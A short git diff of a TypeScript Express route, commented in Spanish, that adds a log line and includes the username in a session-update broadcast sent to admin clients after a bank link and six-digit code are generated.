@@ -625,6 +625,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log(`URL del admin: ${adminLink}`);
       console.log(`Generado por usuario: ${user.username}`);
 
+      console.log(`Notificando a los clientes de admin sobre el nuevo enlace - Código: ${sixDigitCode}, Banco: ${banco}, Usuario: ${user.username}`);
+      
       // Notificar a los clientes de admin sobre el nuevo enlace
       broadcastToAdmins(JSON.stringify({
         type: 'LINK_GENERATED',
@@ -637,8 +639,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }));
 
       // Enviar también un mensaje de actualización de sesiones para refrescar la lista
+      // Este mensaje hará que todos los clientes obtengan la lista actualizada del servidor
       broadcastToAdmins(JSON.stringify({
-        type: 'SESSIONS_UPDATED'
+        type: 'SESSIONS_UPDATED',
+        data: {
+          userName: user.username
+        }
       }));
 
       res.json({ 
